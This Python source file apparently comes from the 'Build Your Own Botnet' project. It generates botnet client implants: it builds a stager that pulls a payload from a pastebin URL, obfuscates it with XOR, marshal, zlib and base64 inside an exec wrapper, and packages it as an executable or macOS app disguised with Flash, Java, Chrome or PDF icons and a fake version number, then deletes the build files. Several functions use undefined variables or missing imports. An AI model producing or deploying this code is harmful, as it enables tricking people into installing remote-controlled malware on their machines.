#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
# standard library
import os
import sys
import urllib
import colorama
import subprocess
# byob
import util
import stager
import crypto

class ClientError(Exception):
    pass

colorama.init(autoreset=False)


@util.config(platforms=['win32','linux2','darwin'])
def py(source='payload.py', payload='https://pastebin.com/raw/yt6GnYx4', **kwargs):
    try:
        path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
        key  = base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')
        if bool(len(sys.argv) > 1 and len(sys.argv) < 3):
            if os.path.isfile(sys.argv[1]):
                source = sys.argv[1]
            if os.path.isfile(sys.argv[2]):
                path = sys.argv[2]
        code = open(source,'r').read()
        print(colorama.Fore.RESET + colorama.Style.DIM)
        print("Encrypting {} ({:,} bytes)...".format(os.path.basename(source), len(code)))
        data = encrypt_xor(code, key)
        with file(dst,'w') as fp:
            fp.write(data)
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Complete", end="")
        print(colorama.Style.BRIGHT + colorama.Fore.RESET + "{:,} bytes written to target file: {}".format(len(data), os.path.basename(dst)).ljust(80 - len("[+] ")))


        code = ['#!/usr/bin/python',"from __future__ import print_function", open('resources/stager.py','r').read(), "if __name__=='__main__':", "\t{}=Stager(config='{}', debug=('--debug' in sys.argv or 'debug' in sys.argv))".format(util.variable(1), payload)]
        data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile('\n'.join(code), '', 'exec')), 9))))
        with file(path, 'w') as fp:
            fp.write(data)
        return path
    except Exception as e:
        return'{} error: {}'.format(py.func_name, str(e))


@util.config(platforms=['win32','linux2'])
def exe(**kwargs):
    try:
        path = kwargs.get('path')
        if not path:
            return "Error: missing keyword argument 'path'"
        if not os.path.exists(path):
            return "Error: file '%s' not found" % path
        if sys.platform not in ('win32','linux2','darwin'):
            return "Cannot compile executables compatible with %s platforms" % sys.platform
        os.chdir(os.path.dirname(path))
        orig    = os.getcwd()
        pyname  = os.path.basename(path)
        name    = os.path.splitext(pyname)[0]
        dist    = os.path.dirname(path)
        key     = util.variable(16)
        apps    = [i for i in ['flash','java','chrome','firefox','safari','explorer','edge','word','excel','pdf'] if i in name]
        appicon = util.resource('resource icon %s' % apps[0]) if len(apps) else util.resource('resource icon java')
        icon    = util.wget(appicon) if os.name != 'nt' else os.path.splitdrive(util.wget(appicon))[1].replace('\\','/')
        pkgs    = list(set([i.strip().split()[1] for i in open(path).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(util.resource('stager config')).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec    = util.resource('resource stager spec').replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec   = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(spec)
        make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
        exe   = os.path.join(os.path.join(dist, 'dist'), name + '.exe' if os.name is 'nt' else name)
        if 'posix' in os.name:
            os.chmod(exe, 755)
        _  = map(util.delete, (path, fspec, os.path.join(dist, 'build')))
        os.chdir(orig)
        return exe
    except Exception as e3:
        return'{} error: {}'.format(client_exe.func_name, str(e3))


@util.config(platforms=['darwin'])
def app(**kwargs):
    try:
        if not kwargs.get('path'):
            return "Error: missing keyword argument 'path'"
        filename        = kwargs.get('path')
        iconName        = kwargs.get('icon') if os.path.isfile(str(kwargs.get('icon'))) else util.resource('resource icon %s.png' % random.choice(['flash','java','chrome','firefox']))
        iconFile        = util.wget(iconName)
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath 	    = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = ' '.join(bundleName, version)
        bundleIdentity  = 'com.' + bundleName
        infoPlist       = urllib2.urlopen(util.resource('resource plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        _ = os.popen('chmod +x %s' % executable).read()
        return appPath
    except Exception as e:
        return "{} error: {}".format(client_app.func_name, str(e))

def usage():
    util.display("usage: client.py <type> [,name,icon]\n    type:\tpy, exe, app\n    icon:\tpdf, java, flash\n    name:\tup to 20 alphanumeric characters", color='yellow', style='dim')

def main():
    args = {}
    if not len(sys.argv) > 1 or sys.argv[1] not in ('py','exe','app'):
        usage()
    else:
        mode = sys.argv[1].lower()
        name = 'byob_%s' % util.variable(3)
        icon = 'pdf' if mode in ('exe','app') else None
        if len(sys.argv) > 2:
            args = util.kwargs(' '.join(sys.argv[2:]))
            name = kwargs.get('name') if 'name' in args else name
            icon = kwargs.get('icon') if kwargs.get('icon') in ('java','flash','pdf') else icon
        try:
            return eval(mode)(name=name, icon=icon)
        except Exception as e:
            raise ClientError(str(e))
            
if __name__ == '__main__':
    main()
